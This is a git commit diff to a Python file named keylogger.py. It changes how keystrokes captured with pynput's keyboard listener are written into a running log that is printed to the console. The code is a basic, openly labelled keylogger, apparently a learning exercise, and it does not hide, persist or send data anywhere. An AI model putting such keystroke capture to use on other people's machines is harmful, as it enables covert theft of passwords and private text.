15e576ae3ac1f9f5b4c07e45d5fabb788b5202b3
Shivam Singh <dreamyshivam01@gmail.com>
2025-03-02 23:09:04 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -4,11 +4,17 @@ log = ""
 
 def process_key_press(key):
     global log
-    log = log + str(key)
-    print(key)
+    try:
+        log = log + str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log = log + " "
+        else:
+            log = log + " " + str(key) + " "
+
+    print(log)
 
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
 with keyboard_listener:
     keyboard_listener.join()
-
-        
+    
